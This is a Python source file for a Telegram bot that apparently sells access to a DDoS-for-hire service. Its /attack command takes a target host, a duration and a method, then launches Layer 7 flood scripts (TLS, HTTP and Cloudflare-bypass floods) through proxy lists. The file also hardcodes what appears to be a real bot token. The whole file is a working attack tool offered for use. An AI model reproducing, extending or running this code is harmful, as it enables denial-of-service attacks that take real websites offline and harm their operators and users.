import subprocess
import telebot
import threading
import logging
from telebot import types
import requests
import datetime
import time
import aiohttp

import telnetlib
import random
import string
OWNERS = [5550508880]  # replace with admin's ids
USERS_FILE = "users.txt"  # dont change
bot_token = '6374476745:AAGBqMVsRqgyZFKtB6JQZFrhAVXq8LgvtGs'  # edit to your bot token

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(bot_token)

@bot.message_handler(commands=['start'])
def hello(message):
    bot.send_message(message.chat.id, f'👋 Hello, {message.from_user.first_name}. Type /help to get started!')
    command = message.text
    logging.info("Command: %s executed by %s %s", command, message.from_user.first_name, message.from_user.last_name)

@bot.message_handler(commands=['help'])
def helpcmd(message):
    messag = f"User Commands: \n\n" \
    f"/start - Start the bot\n" \
    f"/help - Show this help menu\n" \
    f"/methods - Show attack methods\n" \
    f"/attack - start an attack\n" \
    f"\n" \
    f"Admin Commands:\n\n" \
    f"/add - Add a user to the database\n" \
    f"/remove - Delete a user from the database\n" \
    f"/reload - Reload bot assets\n" \
    f"\n\nTo buy bot access - message Pagee.online"
    bot.send_message(message.chat.id, messag)
    command = message.text
    logging.info("Command: %s executed by %s %s", command, message.from_user.first_name, message.from_user.last_name)

@bot.message_handler(commands=['methods'])
def methods(message):
    message_text = f"🚀 Method:\n" \
    f"⚡CLOUDFLARE - Layer7⚡\n" \
    f"⚡DESTROY - Layer7⚡\n" \
    f"⚡CF-PRO - Layer7⚡\n" \
    f"⚡TLS-V1 - Layer7⚡\n" \
    f"⚡TLS-FLOOD - Layer7⚡\n" \
    f"⚡HTTP-FLOOD - Layer7⚡\n"
    bot.send_message(message.chat.id, message_text)
@bot.message_handler(commands=['attack'])
def attack(message):
    args = message.text.split()[1:]
    if len(args) != 3:
        bot.send_message(message.chat.id, "`/attack <host> <time> <method>`")
        return

    host = args[0]
    time = args[1]
    method = args[2]

    methods = ['CLOUDFLARE', 'CF-PRO', 'DESTROY','TLS-V1','TLS-FLOOD','HTTP-FLOOD','HTTP-VIP']
    if method in methods:
        bot.send_message(message.chat.id, 'Loading server(s) for attack...')
        if method == "CLOUDFLARE":
            subprocess.run(['node', 'tls-cloudflare.js', host, time, '80', '10', 'proxy.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "CF-PRO":
            subprocess.run(['node', 'cf-pro.js', 'GET', host, 'proxy.txt', time, '80', '10'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "DESTROY":
            subprocess.run(['node', 'DESTROY.js', host, time, '80', '10', 'proxy.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "TLS-V1":
            subprocess.run(['node', 'tlsv1.js', host, time, '80', '10', 'proxy.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "TLS-FLOOD":
            subprocess.run(['node', 'tlsv2.js', host, time, '80', '10', 'proxy.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "HTTP-FLOOD":
            subprocess.run(['./AyaV2', host, time, '10', 'proxy.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        else:
            bot.send_message(message.chat.id, "Invalid method!")
            return
@bot.message_handler(commands=['reload'])
def reload(message):
    if message.from_user.id not in OWNERS:
        bot.send_message(message.chat.id, "You do not have permission to execute this command.")
        return
    bot.send_message(message.chat.id, "Successfully reloaded all assets!")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id not in OWNERS:
        bot.send_message(message.chat.id, "You do not have permission to execute this command.")
        return

    user_id = int(message.text.split()[1]) if len(message.text.split()) > 1 else None
    if user_id is None:
        bot.send_message(message.chat.id, "Please provide a user ID to add.")
        return

    with open(USERS_FILE, "a") as f:
        f.write(str(user_id) + "\n")

    bot.send_message(message.chat.id, f"User with ID `{user_id}` has been added.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id not in OWNERS:
        bot.send_message(message.chat.id, "You do not have permission to execute this command.")
        return

    user_id = int(message.text.split()[1]) if len(message.text.split()) > 1 else None
    if user_id is None:
        bot.send_message(message.chat.id, "Please provide a user ID to remove.")
        return

    with open(USERS_FILE, "r") as f:
        users = f.read().splitlines()

    if str(user_id) not in users:
        bot.send_message(message.chat.id, f"User with ID `{user_id}` is not in the database.")
        return

    users.remove(str(user_id))

    with open(USERS_FILE, "w") as f:
        f.write("\n".join(users))

    bot.send_message(message.chat.id, f"User with ID `{user_id}` has been removed.")

def get_authorized_users():
    try:
        with open(USERS_FILE) as f:
            return [int(line.strip()) for line in f]
    except FileNotFoundError:
        return []

if __name__ == "__main__":
    bot.polling(none_stop=True)
